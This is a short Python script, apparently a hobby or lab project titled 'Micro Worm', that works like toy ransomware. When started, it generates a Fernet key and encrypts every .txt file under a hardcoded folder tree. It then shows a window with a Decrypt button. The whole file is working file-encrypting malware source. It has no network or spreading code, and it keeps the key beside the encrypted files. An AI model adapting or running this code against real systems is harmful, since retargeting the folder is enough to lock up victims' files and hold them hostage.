from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import *

ROOT_DIR = r'C:\Users\Asus VivoBook\PycharmProjects\WORM\ROOT'
KEY = None
KEY_PATH = r'C:\Users\Asus VivoBook\PycharmProjects\WORM\ROOT\key.key'

def create_key():
    global KEY, KEY_PATH
    KEY = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as key_file:
        key_file.write(KEY)

def load_key():
    global KEY, KEY_PATH
    KEY = open(KEY_PATH, 'rb').read()

def encrypt_file(file_path):
    global KEY
    f = Fernet(KEY)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path):
    global KEY
    f = Fernet(KEY)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    decrypted_data = f.decrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def encrypt_folder(dir_path):
    global KEY
    file_paths = []
    folders_paths = []
    for path in os.listdir(dir_path):
        if path.endswith('.txt'):
            file_paths.append(os.path.join(dir_path, path))
        elif path.endswith('.key'):
            continue
        else:
            folders_paths.append(os.path.join(dir_path, path))
    for file in file_paths:
        encrypt_file(file)
    if len(folders_paths) != 0:
        for folder in folders_paths:
            encrypt_folder(folder)

def decrypt_folder(dir_path):
    global KEY
    file_paths = []
    folders_paths = []
    for path in os.listdir(dir_path):
        if path.endswith('.txt'):
            file_paths.append(os.path.join(dir_path, path))
        elif path.endswith('.key'):
            continue
        else:
            folders_paths.append(os.path.join(dir_path, path))
    for file in file_paths:
        decrypt_file(file)
    if len(folders_paths) != 0:
        for folder in folders_paths:
            decrypt_folder(folder)

def display():
    window = tk.Tk()
    window.geometry('500x500')
    window.resizable(0, 0)
    text = Label(window, text='Micro Worm created by Micro Lab (Păpăluță Vasile)')
    text.place(relx=0.5, rely=0.5, anchor=CENTER)
    decrypt = Button(window, text='Decrypt', command=lambda : decrypt_folder(ROOT_DIR))
    decrypt.place(rely=0.6, relx=0.5, anchor=CENTER)
    window.mainloop()

if 'key.key' in os.listdir(ROOT_DIR):
    load_key()
else:
    create_key()
    load_key()
encrypt_folder(ROOT_DIR)
display()